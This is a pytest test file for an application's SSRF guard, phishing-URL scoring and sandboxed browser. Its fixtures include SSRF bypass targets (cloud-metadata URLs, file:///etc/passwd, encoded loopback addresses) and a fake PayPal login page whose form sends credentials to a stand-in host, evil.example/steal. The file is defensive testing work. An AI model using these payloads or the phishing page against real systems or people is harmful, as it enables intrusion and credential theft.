"""SSRF guard, phishing URL model and the disposable browser (real headless Chromium against a local fake phishing page)."""
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlsplit

import pytest

from app import ssrf
from tests.test_api import client, register, RUN  # noqa: F401


# ---------------------------------------------------------------- SSRF guard (pure unit tests, no network needed)
@pytest.mark.parametrize("url", [
    "http://127.0.0.1/", "http://localhost/", "http://localhost:80/admin", "http://169.254.169.254/latest/meta-data/", "http://10.0.0.5/", "http://192.168.1.10/",
    "http://172.16.0.1/", "http://[::1]/", "http://[::ffff:127.0.0.1]/", "http://0.0.0.0/", "http://100.64.0.1/", "http://printer.local/", "http://metadata.google.internal/",
    "http://user:pass@93.184.216.34/", "http://93.184.216.34:8080/", "ftp://93.184.216.34/", "file:///etc/passwd", "javascript:alert(1)", "", "x" * 3000,
])
def test_ssrf_blocks_dangerous_targets(url):
    with pytest.raises(ssrf.UnsafeUrl):
        ssrf.check_url(url)


def test_ssrf_blocks_numeric_host_tricks():
    for url in ("http://2130706433/", "http://0x7f.0.0.1/", "http://017700000001/"):   # all notations of 127.0.0.1
        with pytest.raises(ssrf.UnsafeUrl):
            ssrf.check_url(url)


def test_ssrf_allows_public_addresses():
    assert ssrf.check_url("https://93.184.216.34/path?q=1") == "https://93.184.216.34/path?q=1"
    assert ssrf.check_url("93.184.216.34").startswith("http://")


# ---------------------------------------------------------------- API
def test_url_check_model_and_private_targets(client):
    sh, _, _ = register(client, "student", 61)
    bad = client.post("/api/safe/check-url", headers=sh, json={"url": "http://secure-paypal-login.verify-account-update.tk/signin?id=1&session=abc"}).json()
    good = client.post("/api/safe/check-url", headers=sh, json={"url": "https://en.wikipedia.org/wiki/Python_(programming_language)"}).json()
    assert bad["riskScore"] > good["riskScore"] and bad["riskLevel"] in ("medium", "high") and good["riskLevel"] == "low"
    assert bad["reasons"]
    assert client.post("/api/safe/check-url", json={"url": "http://x.com"}).status_code == 401
    for url in ("http://127.0.0.1:8000/api/admin/stats", "http://169.254.169.254/latest/meta-data/", "file:///c:/windows/win.ini", "http://localhost/"):
        r = client.post("/api/safe/open", headers=sh, json={"url": url})
        assert r.status_code == 422, (url, r.text)


# ---------------------------------------------------------------- disposable browser against a local fake phishing page
PAGE = b"""<html><head><title>PayPal - Log in to your account</title></head><body>
<h1>Welcome to PayPal</h1><form action="http://evil.example/steal" method="post">
<input name="email"><input type="password" name="pw"><button>Log In</button></form>
<img src="http://169.254.169.254/latest/meta-data/"><iframe src="about:blank"></iframe></body></html>"""


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(PAGE)

    def log_message(self, *a):
        pass


@pytest.fixture
def phishing_server(monkeypatch):
    srv = HTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    real = ssrf.acheck_url

    async def allow_local_page_only(url):
        if urlsplit(url).hostname == "127.0.0.1" and urlsplit(url).port == srv.server_port:
            return url
        return await real(url)                      # everything else (e.g. the cloud-metadata image) stays blocked

    import app.routers.safe as safe_router
    import app.sandbox as sandbox
    monkeypatch.setattr(safe_router, "acheck_url", allow_local_page_only)
    monkeypatch.setattr(sandbox, "acheck_url", allow_local_page_only)
    yield f"http://127.0.0.1:{srv.server_port}/"
    srv.shutdown()


def test_sandbox_detects_phishing_page_and_blocks_internal_requests(client, phishing_server):
    sh, _, _ = register(client, "student", 62)
    r = client.post("/api/safe/open", headers=sh, json={"url": phishing_server})
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["opened"] and d["cleared"] is True and d["javascript"] is False
    assert d["screenshot"].startswith("data:image/png;base64,") and "PayPal" in d["title"]
    assert d["passwordFields"] == 1
    reasons = " ".join(d["reasons"])
    assert "different site" in reasons and "Pretends to be Paypal" in reasons
    assert d["riskLevel"] in ("medium", "high") and d["riskScore"] >= 70
    assert "169.254.169.254" in d["blockedRequests"]          # the page tried to reach the metadata service; it was refused
    assert client.post("/api/safe/open", json={"url": phishing_server}).status_code == 401
